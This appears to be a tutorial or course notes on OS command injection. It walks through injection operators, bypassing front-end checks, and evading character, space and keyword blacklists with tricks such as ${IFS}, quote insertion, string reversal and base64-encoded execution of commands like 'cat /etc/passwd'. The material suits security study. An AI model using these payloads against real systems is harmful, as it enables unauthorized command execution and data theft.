# Detection

**Host Checker**

Suppose a web app asks for an IP address to “check” if it’s alive. 
Entering 127.0.0.1 gives ping results, meaning the app is probably running:

`ping -c 1 OUR_INPUT`

If the input isn’t sanitized, you can try adding another command.

| Operator   | Character | URL Encoded | Effect                          |                          |                            |
| ---------- | --------- | ----------- | ------------------------------- | ------------------------ | -------------------------- |
| Semicolon  | `;`       | `%3b`       | Runs both commands              |                          |                            |
| New Line   | `\n`      | `%0a`       | Runs both                       |                          |                            |
| Background | `&`       | `%26`       | Runs both (second output first) |                          |                            |
| Pipe       | \`        | \`          | `%7c`                           | Shows only second output |                            |
| AND        | `&&`      | `%26%26`    | Second runs if first works      |                          |                            |
| OR         | \`        |             | \`                              | `%7c%7c`                 | Second runs if first fails |
| Sub-shell  | `` ` ` `` | `%60%60`    | Runs both (Linux only)          |                          |                            |
| Sub-shell  | `$( )`    | `%24%28%29` | Runs both (Linux only)          |                          |                            |


# Injecting Commands

We suspect the Host Checker app is vulnerable to command injection. First, we try the semicolon (;) operator, which lets us run multiple commands. Example:

`ping -c 1 127.0.0.1; whoami`

On our Linux VM, this works — it pings the IP and shows the current username.

**Front-End Blocking**

When we try 127.0.0.1; whoami in the web app, it refuses the input because it only accepts IPs. Using browser developer tools, we see no request was sent — meaning the check is front-end only.

**Bypassing the Front-End**

Front-end validation can be bypassed by sending requests directly to the back-end.

Steps:

- Open Burp Suite (or ZAP) and set the browser to use it as a proxy.
- Send a normal request (e.g., 127.0.0.1) and intercept it.
- Modify the intercepted request to include the payload (127.0.0.1; whoami), URL-encode it, and send.


# Other Injection Operators

Besides the semicolon (;), there are other ways to inject commands:

**AND Operator (&&)**

Runs the second command only if the first one succeeds.

Example:

`ping -c 1 127.0.0.1 && whoami`

Works well; both commands run if ping works.

**OR Operator (||)**

Runs the second command only if the first one fails.

Example:

`ping -c 1 127.0.0.1 || whoami`

Since ping works, whoami doesn’t run here.

But if ping fails (e.g., no IP given):

`ping -c 1 || whoami`

Then whoami runs because ping failed.


# Bypassing Space Filters

Developers often block special characters like spaces to stop injections. But there are ways to get around these filters.

**New-Line Character Works**

Most special characters are blocked, but the new-line `(\n)` usually isn’t because it’s often needed. Using new-line `(%0a)` after our input works and lets us add commands.

**Space Character is Blocked**

If we try to add a space after new-line, like `127.0.0.1\n whoami`, it gets blocked. This means spaces are also blacklisted.

**Ways to Bypass Space Filters**

- Use Tabs: Instead of spaces, use a tab `(%09)`. Both Linux and Windows accept tabs between commands, and it works the same.
- Use `${IFS}`: This Linux variable stands for "Internal Field Separator" and usually means space or tab. So `${IFS}` acts like a space in commands.
- Brace Expansion: Bash can insert spaces automatically between items inside braces. For example, `{ls,-la}` runs `ls -la` without writing a space.


# Bypassing Other Blacklisted Characters

Besides operators and spaces, slashes (/) and backslashes (\) are often blocked because they’re needed for file paths.

**How to Bypass on Linux**

Use environment variables to get these characters instead of typing them directly.

For example, `$PATH` usually contains / characters. You can extract just one slash like this:

`echo ${PATH:0:1}`

This prints /.

Similarly, to get a semicolon ;, you can extract it from another variable, like `${LS_COLORS:10:1}`.

You can build payloads by combining these extracted characters. For example:

`127.0.0.1${LS_COLORS:10:1}${IFS}`

This adds a semicolon and a space without typing them.

Use printenv to find useful environment variables holding special characters.

**How to Bypass on Windows**

Similar tricks work on Windows CMD and PowerShell by extracting characters from environment variables.

Example in CMD to get a backslash (\):

`echo %HOMEPATH:~6,-11%`

Example in PowerShell to get the first character of `%HOMEPATH%`:

`$env:HOMEPATH[0]`

Use Get-ChildItem Env: in PowerShell to list variables and find useful characters.

**Character Shifting Technique**

You can also use character shifting to get a needed character by shifting from another nearby ASCII character.

Example in Linux:

`echo $(tr '!-}' '"-~'<<<[)`

This shifts [ (ASCII 91) to \ (ASCII 92).

Similar but longer commands exist for Windows PowerShell.

**Don't forget to use `%0a` in some cases as a space**


# Bypassing Blacklisted Commands

Besides blocking characters, web apps often block certain command words (like whoami, cat). But we can trick these filters by changing how the command looks, without changing what it does.

**How Command Blacklists Work**

If a command word is exactly matched (like whoami), the request is blocked. But if we change the command slightly, it might get through.

Example in PHP:

<pre>$blacklist = ['whoami', 'cat', ...];
foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}</pre>

**Easy Trick: Insert Quotes**

Insert single ' or double " quotes inside the command letters. Shells ignore these quotes but still run the command.

Example:

`w'h'o'am'i`
`w"h"o"am"i`

Both run whoami successfully.

Note: Use only one type of quote and make sure quotes come in pairs.

**Try in Payload**

Use something like:

`127.0.0.1%0aw'h'o'am'i`

This bypasses the blacklist and runs your command.

**Linux-Only Tricks**
You can also insert backslashes `\` or `$@` inside commands; Bash ignores these.

Examples:


`who$@ami`
`w\ho\am\i`

**Windows-Only Trick**

Insert a caret `^` inside commands in Windows CMD.

Example:

`who^ami`

# Advanced Command Obfuscation (Simplified)

When basic evasion tricks fail because of stronger filters or WAFs, you can hide (obfuscate) your commands so they’re harder to detect.

**1. Case Manipulation**

Change letter casing (e.g., WhOaMi instead of whoami).
Windows: Commands are case-insensitive, so any casing works.
Linux: Case matters. You can convert to lowercase before running:

`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`

If spaces are blocked, replace them with tabs (%09).

**2. Reversed Commands**

Write the command backwards, then reverse it before running:

`$(rev<<<'imaohw')`   # Executes 'whoami'

Works on both Linux and Windows (different syntax for reversing strings).

**3. Encoded Commands**

Encode commands to bypass filters, then decode at runtime.

Example with Base64 in Linux:

`echo -n 'cat /etc/passwd' | base64`
`bash<<<$(base64 -d<<<encoded_string)`

Avoid filtered characters (like pipes) by using alternatives (e.g., <<< instead of |).

**Key Idea:**

**Mix and match these:**

- Case changes to dodge keyword filters.
- Reverse strings so the original command text never appears directly.
- Encode commands to hide forbidden characters.
- These tricks help slip past stricter filters and WAFs while still executing the original command.
